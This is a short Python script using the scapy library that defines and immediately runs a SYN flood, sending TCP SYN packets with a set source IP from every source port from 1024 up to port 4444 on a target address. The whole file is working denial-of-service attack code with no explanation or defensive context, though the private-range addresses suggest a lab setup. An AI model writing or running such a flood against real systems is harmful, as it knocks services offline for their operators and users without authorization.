from scapy.all import *

def synFlood(src,tgt):
    for sport in range (1024, 65535):
        L3 = IP(src=src, dst=tgt)
        L4 = TCP(sport=sport, dport=4444,flags='S',seq=1000)
        pkt = L3/L4
        send(pkt)

src =  "192.168.0.105"
tgt =  "192.168.56.1"
synFlood(src,tgt)